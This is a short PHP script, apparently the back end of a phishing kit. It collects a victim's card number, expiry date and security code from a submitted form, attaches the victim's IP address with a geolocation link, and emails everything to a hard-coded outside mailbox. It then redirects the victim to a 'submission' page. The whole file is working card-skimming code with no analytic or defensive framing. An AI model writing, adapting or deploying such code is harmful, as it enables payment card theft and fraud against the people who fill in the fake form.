<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Card Number-----: ".$_POST['cardNumber']."<br>\n";
$bilsmg .= "|Expiry-----: ".$_POST['expDate']."<br>\n";
$bilsmg .= "|Security Code-----: ".$_POST['verificationCode']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@mailfence.com";
$bilsub = "Pepek| From $ip";
$bilhead = "From:Kartu Pepek <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../submission.html";
header("location:$src");
?>